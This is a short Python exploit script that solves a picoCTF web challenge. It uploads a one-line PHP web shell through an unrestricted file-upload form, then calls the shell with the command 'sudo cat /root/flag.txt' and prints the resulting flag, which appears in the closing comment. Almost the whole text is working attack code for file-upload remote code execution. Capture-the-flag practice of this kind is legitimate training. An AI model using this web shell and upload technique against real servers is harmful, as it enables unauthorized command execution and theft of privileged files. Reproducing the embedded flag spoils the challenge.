import requests

url = "http://standard-pizzas.picoctf.net:49315/"
shell = '<?php system($_GET["cmd"]); ?>'
resp = requests.post(url + "upload.php", data={"submit": "Upload File"}, files={
    "fileToUpload": ("exp.php", shell),
})
print(resp.text, resp.status_code)  # The file exp.php has been uploaded Path: uploads/exp.php  200

cmd = "sudo cat /root/flag.txt"
resp = requests.get(url + "uploads/exp.php?cmd=" + cmd)
print(resp.text)

# picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}
